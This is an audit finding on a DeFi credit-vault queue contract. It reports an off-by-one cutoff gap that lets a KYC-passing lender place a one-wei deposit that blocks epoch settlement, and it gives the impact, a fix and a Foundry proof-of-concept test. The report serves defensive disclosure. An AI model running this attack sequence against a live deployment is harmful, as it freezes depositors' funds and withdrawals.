### Title
Prefunded deposit cutoff gap allows a KYC user to indefinitely block epoch settlement - ([File: contracts/IdleCDOEpochQueue.sol])

### Summary
The AA prefunded queue uses complementary boundary checks incorrectly: `requestDeposit` rejects deposits at `block.timestamp + prefundedDepositWindow == epochEndDate`, while `processDepositsToBorrower` also rejects prefunding at that timestamp. [1](#0-0) [2](#0-1)   
A malicious lender can place the first queued deposit at the last accepted timestamp after an empty prefunding call, after which the deposit can neither be prefunded nor bypassed. [3](#0-2)   
Because `prefundedDepositsToProcess` reverts while raw pending deposits remain for the settled epoch, the prefunded CDO’s `stopEpochWithDuration` transaction reverts during `_afterStopEpochWithDuration`. [4](#0-3) [5](#0-4) 

### Finding Description
`requestDeposit` targets the next strategy epoch and stores deposits in `epochPendingDeposits[nextEpoch]`. [6](#0-5)   
For a cutoff `T = epochEndDate - prefundedDepositWindow`, deposits are rejected when `block.timestamp >= T`, but prefunding is permitted only when `block.timestamp < T`. [1](#0-0) [7](#0-6)   
At timestamp `T - 1`, the attacker can deposit after an honest manager’s empty `processDepositsToBorrower` call returns without setting `epochPrefundedDeposits`; at the next timestamp `>= T`, prefunding is permanently unavailable while the deposit remains pending. [3](#0-2)   
The depositor can remove the request through `deleteRequest`, but neither the owner nor manager can clear it, so protocol recovery depends on the attacker voluntarily releasing the queue. [8](#0-7)   
On settlement, `prefundedDepositsToProcess` checks the settled epoch and reverts when `epochPendingDeposits[_epoch] != 0`, causing the entire `stopEpochWithDuration` call to roll back even after the base stop logic succeeded. [9](#0-8) [10](#0-9)   
The direct `stopEpoch` path is deliberately blocked when a prefunded queue is configured, so there is no privileged fallback that skips `_afterStopEpochWithDuration`. [11](#0-10) 

### Impact Explanation
A KYC-passing lender can indefinitely freeze the whole prefunded credit vault at epoch end by donating a small first queued deposit, such as one wei of underlying, into the boundary gap. [12](#0-11)   
The freeze prevents borrower repayment from being accepted through `stopEpochWithDuration`, leaves all active tranche holders unable to complete the normal epoch transition, and keeps withdrawal requests from maturing until the attacker deletes the request. [13](#0-12) [14](#0-13)   
The loss is temporary attacker-controlled freezing of the full vault NAV rather than direct theft; the attacker can hold repayment and withdrawals hostage with only the queued dust amount. [15](#0-14) 

### Likelihood Explanation
The attacker only needs to satisfy the same wallet/KYC check required for ordinary queue deposits and does not need privileged access. [16](#0-15) [17](#0-16)   
The attack requires transaction ordering around the final prefunding-permitted timestamp: the manager’s empty prefunding call must execute before the attacker’s first deposit in that timestamp, and the next block must cross the cutoff. [3](#0-2)   
No existing guard prevents this sequence because `EpochNotRunning` only requires the epoch to remain active, `epochPrefundedDeposits` remains zero after an empty processing call, and `checkPrefunding` does not enforce the cutoff independently. [18](#0-17) [19](#0-18) 

### Recommendation
Change `processDepositsToBorrower` to permit settlement at the cutoff boundary by replacing the strict comparison with `block.timestamp + _prefundedWindow <= _cdo.epochEndDate()`. [7](#0-6)   
This makes `T` a processing-only boundary: deposits remain closed at `T`, while queued funds can still be forwarded rather than becoming unprocessable. [1](#0-0)   
Alternatively, close deposits strictly before the last valid prefunding timestamp, but the first change is smaller and preserves the documented cutoff semantics. [20](#0-19) 

### Proof of Concept
The following Foundry test should be added to the prefunded queue test context and use its existing deployed `prefundedQueue`, `cdoEpoch`, `strategy`, `underlying`, `tranche`, `manager`, and borrower-funding helper conventions. [21](#0-20) 

```solidity
function testPrefundedDepositCutoffGapBlocksStopEpoch() external {
  uint256 window = 1 days;
  uint256 dust = 1;
  address attacker = makeAddr("kycAttacker");

  vm.prank(manager);
  prefundedQueue.setPrefundedDepositWindow(window);

  // Enter the active epoch normally and enable the configured prefunded AA queue.
  vm.prank(manager);
  cdoEpoch.startEpoch();

  uint256 cutoff = cdoEpoch.epochEndDate() - window;

  // Last timestamp at which both paths are currently permitted.
  vm.warp(cutoff - 1);

  // Honest manager checks the queue while it is still empty. The call returns
  // without setting epochPrefundedDeposits[nextEpoch].
  vm.prank(manager);
  prefundedQueue.processDepositsToBorrower();

  // Same timestamp: the attacker's first deposit is still accepted because the
  // epoch was not closed by the empty prefunding call.
  deal(address(underlying), attacker, dust);
  vm.startPrank(attacker);
  underlying.approve(address(prefundedQueue), dust);
  prefundedQueue.requestDeposit(dust);
  vm.stopPrank();

  uint256 nextEpoch = strategy.epochNumber() + 1;
  assertEq(prefundedQueue.epochPendingDeposits(nextEpoch), dust);
  assertEq(prefundedQueue.epochPrefundedDeposits(nextEpoch), 0);

  // At the cutoff timestamp deposits are closed, but prefunding is also closed.
  vm.warp(cutoff);
  vm.expectRevert(NotAllowed.selector);
  vm.prank(manager);
  prefundedQueue.processDepositsToBorrower();

  // Fund and approve the honest borrower so failure cannot be attributed to a
  // missing repayment transfer.
  uint256 borrowerBalance = underlying.balanceOf(strategy.borrower());
  uint256 needed =
    cdoEpoch.expectedEpochInterest() +
    strategy.pendingWithdraws() +
    cdoEpoch.getContractValue();
  deal(address(underlying), strategy.borrower(), borrowerBalance + needed);
  vm.prank(strategy.borrower());
  underlying.approve(address(cdoEpoch), type(uint256).max);

  // Base stop processing can succeed, but _afterStopEpochWithDuration reaches
  // prefundedDepositsToProcess, which sees epochPendingDeposits[nextEpoch] != 0
  // and reverts the entire settlement transaction.
  vm.warp(cdoEpoch.epochEndDate());
  vm.expectRevert(NotAllowed.selector);
  vm.prank(manager);
  cdoEpoch.stopEpochWithDuration(0, 0, cdoEpoch.epochDuration(), 0);

  assertTrue(cdoEpoch.isEpochRunning());
  assertEq(prefundedQueue.epochPendingDeposits(nextEpoch), dust);
}
```

### Citations

**File:** contracts/IdleCDOEpochQueue.sol (L72-91)
```text
  function initialize(
    address _idleCDOEpoch,
    address _owner,
    bool _isAATranche
  ) external initializer {
    _checkNotAllowed(idleCDOEpoch != address(0));
    OwnableUpgradeable.__Ownable_init();
    ReentrancyGuardUpgradeable.__ReentrancyGuard_init();

    IdleCDOEpochVariant _cdo = IdleCDOEpochVariant(_idleCDOEpoch);
    idleCDOEpoch = _idleCDOEpoch;
    strategy = _cdo.strategy();
    underlying = _cdo.token();
    tranche = _isAATranche ? _cdo.AATranche() : _cdo.BBTranche();
    
    // approve the CDO contract to spend the underlying tokens 
    IERC20Detailed(underlying).safeApprove(address(_cdo), type(uint256).max);

    transferOwnership(_owner);
  }
```

**File:** contracts/IdleCDOEpochQueue.sol (L103-127)
```text
  function requestDeposit(uint256 amount) external nonReentrant {
    // check if the wallet is allowed to deposit (ie epoch is running and keyring KYC completed)
    _checkAllowed(msg.sender);

    IdleCDOEpochVariant _cdo = IdleCDOEpochVariant(idleCDOEpoch);
    uint256 nextEpoch = IdleCreditVault(strategy).epochNumber() + 1;
    uint256 _prefundedWindow = prefundedDepositWindow;
    // Only the AA prefunded queue enforces a deposit cutoff for the next epoch.
    if (tranche == _cdo.AATranche() && _isPrefundedQueueEnabled()) {
      IdleCDOEpochVariantPrefunded(idleCDOEpoch).checkPrefunding(epochPendingDeposits[nextEpoch] + amount);
      // Once funds are prefunded, or once the subscription window is reached, the next epoch is closed.
      _checkNotAllowed(
        epochPrefundedDeposits[nextEpoch] != 0 || (
        _prefundedWindow != 0 && block.timestamp + _prefundedWindow >= _cdo.epochEndDate()
      ));
    }

    // get underlying tokens from user
    IERC20Detailed(underlying).safeTransferFrom(msg.sender, address(this), amount);
    // deposit will be made in the next buffer period (ie next epoch)
    // updated user queued amount for the next epoch
    userDepositsEpochs[msg.sender][nextEpoch] += amount;
    // update pending deposits
    epochPendingDeposits[nextEpoch] += amount;
  }
```

**File:** contracts/IdleCDOEpochQueue.sol (L145-148)
```text
  /// @notice Send all queued deposits for the next epoch to the borrower before epoch stop
  /// @dev This switches the epoch from "pending in queue" to "prefunded to borrower".
  /// Prefunding can start only once the deposit window for that epoch has closed.
  /// After this call, no additional deposits can join the same epoch.
```

**File:** contracts/IdleCDOEpochQueue.sol (L156-179)
```text
    _checkNotAllowed(tranche != _cdo.AATranche() || !_isPrefundedQueueEnabled());

    // prefunding can be done only while epoch is running
    if (!_cdo.isEpochRunning()) {
      revert EpochNotRunning();
    }
    // Keep prefunding aligned with the same cutoff enforced for new queued deposits.
    uint256 _prefundedWindow = prefundedDepositWindow;
    _checkNotAllowed(_prefundedWindow == 0 || block.timestamp + _prefundedWindow < _cdo.epochEndDate());

    uint256 _epoch = _strategy.epochNumber() + 1;
    // prefunding can happen only once for an epoch
    _checkNotAllowed(epochPrefundedDeposits[_epoch] != 0);
    uint256 _pending = epochPendingDeposits[_epoch];
    if (_pending == 0) {
      return;
    }
    // Recheck after the cutoff because emergency state or the TVL limit can change while queued.
    IdleCDOEpochVariantPrefunded(idleCDOEpoch).checkPrefunding(_pending);

    // Switch the epoch from "queue-held" to "already at borrower" before transferring funds.
    epochPendingDeposits[_epoch] = 0;
    epochPrefundedDeposits[_epoch] = _pending;
    IERC20Detailed(underlying).safeTransfer(_strategy.borrower(), _pending);
```

**File:** contracts/IdleCDOEpochQueue.sol (L182-198)
```text
  /// @notice delete a deposit request
  /// @param _requestEpoch epoch of the deposit request
  function deleteRequest(uint256 _requestEpoch) external {
    // if the epoch price is already set, deposits were already processed so
    // the deposit request can't be deleted.
    _checkNotAllowed(epochPrice[_requestEpoch] != 0 || epochPrefundedDeposits[_requestEpoch] != 0);

    uint256 amount = userDepositsEpochs[msg.sender][_requestEpoch];
    if (amount == 0) {
      return;
    }
    // reset user deposit for the epoch
    userDepositsEpochs[msg.sender][_requestEpoch] = 0;
    // update pending deposits
    epochPendingDeposits[_requestEpoch] -= amount;
    // transfer underlyings back to the user
    IERC20Detailed(underlying).safeTransfer(msg.sender, amount);
```

**File:** contracts/IdleCDOEpochQueue.sol (L203-218)
```text
  function deleteWithdrawRequest(uint256 _requestEpoch) external {
    // if the epoch withdraw price is already set, withdrawal requests were already processed so
    // the withdraw request can't be deleted. Withdraw requests can be deleted even if the epoch is running
    _checkNotAllowed(epochWithdrawPrice[_requestEpoch] != 0 || isEpochWithdrawZero[_requestEpoch]);

    uint256 amount = userWithdrawalsEpochs[msg.sender][_requestEpoch];
    if (amount == 0) {
      return;
    }
    // reset user withdraw request for the epoch
    userWithdrawalsEpochs[msg.sender][_requestEpoch] = 0;
    // update pending withdraw requests
    epochPendingWithdrawals[_requestEpoch] -= amount;
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, amount);
  }
```

**File:** contracts/IdleCDOEpochQueue.sol (L261-281)
```text
    uint256 _epoch = _prefundedEpochToProcess(_cdo);
    uint256 _prefunded = epochPrefundedDeposits[_epoch];
    // in prefunded mode stopEpoch must not leave queue-held deposits behind
    // and must pass the minted tranche amount for the prefunded funds
    _checkNotAllowed(epochPendingDeposits[_epoch] != 0 || _prefunded == 0);

    // Save epoch price for the prefunded deposits based on underlyings deposited and tranche tokens minted
    // In case of very small prefunded deposits, it's possible that the tranche minting results in 0 shares due to rounding.
    // This should not block epoch finalization, as the borrower already has the funds and the epoch can be priced at the current virtual price.
    epochPrice[_epoch] = _prefundedMinted == 0 ? _cdo.virtualPrice(tranche) : _prefunded * ONE_TRANCHE / _prefundedMinted;
    epochPrefundedDeposits[_epoch] = 0;
  }

  /// @notice Get the prefunded deposits amount that the prefunded CDO stop flow must settle
  /// @dev Reverts if the target epoch still has raw pending deposits sitting in the queue
  /// @return _prefunded amount already prefunded to the borrower for the epoch being settled
  function prefundedDepositsToProcess() external view returns (uint256 _prefunded) {
    uint256 _epoch = _prefundedEpochToProcess(IdleCDOEpochVariant(idleCDOEpoch));
    _prefunded = epochPrefundedDeposits[_epoch];
    // Prefunded queues must not reach stopEpochWithDuration with raw underlyings still sitting in the queue.
    _checkNotAllowed(epochPendingDeposits[_epoch] != 0);
```

**File:** contracts/IdleCDOEpochQueue.sol (L413-421)
```text
  /// @notice check if the wallet is allowed to deposit
  /// @param wallet address to check
  function _checkAllowed(address wallet) internal view {
    IdleCDOEpochVariant cdoEpoch = IdleCDOEpochVariant(idleCDOEpoch);
    if (!cdoEpoch.isEpochRunning()) {
      revert EpochNotRunning();
    }
    _checkNotAllowed(!cdoEpoch.isWalletAllowed(wallet));
  }
```

**File:** contracts/IdleCDOEpochVariantPrefunded.sol (L35-47)
```text
  /// @notice Block the direct `stopEpoch` selector when a prefunded queue is configured
  /// @dev `stopEpochWithDuration` still reaches the base stop flow through an internal call.
  /// @param _isClosing true when this stop recalls all pool principal
  /// @return additionalPrincipal prefunded principal already sent to the borrower
  function _beforeStopEpoch(bool _isClosing) internal view override returns (uint256 additionalPrincipal) {
    // `stopEpochWithDuration` calls `stopEpoch` internally, so only block the direct selector path.
    address _queue = epochQueue;
    if (_queue == address(0)) return additionalPrincipal;
    _checkNotAllowed(msg.sig == this.stopEpoch.selector);
    if (_isClosing) {
      uint256 nextEpoch = IdleCreditVault(strategy).epochNumber() + 1;
      additionalPrincipal = IIdleCDOEpochQueuePrefunded(_queue).epochPrefundedDeposits(nextEpoch);
    }
```

**File:** contracts/IdleCDOEpochVariantPrefunded.sol (L61-68)
```text
  /// @notice Check whether an amount can safely move from the queue to the borrower.
  /// @dev Includes the persistent emergency flag and guarded-launch limit that the queue cannot
  /// otherwise observe. The amount must include all queue deposits targeted to the next epoch.
  /// @param _amount queued underlying proposed for prefunding
  function checkPrefunding(uint256 _amount) external view {
    _checkNotAllowed(defaulted || skipDefaultCheck || priceAA == 0);
    _guarded(_amount);
  }
```

**File:** contracts/IdleCDOEpochVariantPrefunded.sol (L70-88)
```text
  /// @notice Finalize prefunded queue deposits after the base stop flow completes
  /// @dev Prefunded AA deposits are minted at the post-stop price even if the borrower defaulted during stop
  function _afterStopEpochWithDuration() internal override {
    address _queue = epochQueue;
    if (_queue == address(0)) return;

    IIdleCDOEpochQueuePrefunded _epochQueue = IIdleCDOEpochQueuePrefunded(_queue);
    uint256 _prefunded = _epochQueue.prefundedDepositsToProcess();
    if (_prefunded == 0) return;
    // A zero post-loss AA price cannot safely mint new shares into the same tranche token.
    _checkNotAllowed(priceAA == 0);

    // Prefunded deposits already reached the borrower, so they must join AA even if stop defaulted.
    // Mint tranche shares at the post-stop price and mirror the same amount in strategy tokens,
    // so the queue can later distribute shares to users at the epoch price.
    uint256 _prefundedMinted = _mintSharesAtCurrPrice(_prefunded, _queue, AATranche);
    IdleCreditVault(strategy).mintStrategyTokens(_prefunded);
    // Finalize the prefunded epoch in the queue by storing the epoch price and clearing state.
    _epochQueue.processPrefundedDeposits(_prefundedMinted);
```

**File:** contracts/IdleCDOEpochVariant.sol (L520-529)
```text
  function stopEpochWithDuration(uint256 _newApr, uint256 _interest, uint256 _duration, uint256 _lossAmount) public {
    // stop epoch checks that msg.sender is allowed
    _stopEpoch(_newApr, _interest, _lossAmount);
    if (_interest != 1 && !defaulted) {
      // buffer period is not changed
      setEpochParams(_duration, bufferPeriod);
      // scale the apr with the new duration and buffer
      _setScaledApr(_newApr);
    }
    _afterStopEpochWithDuration();
```
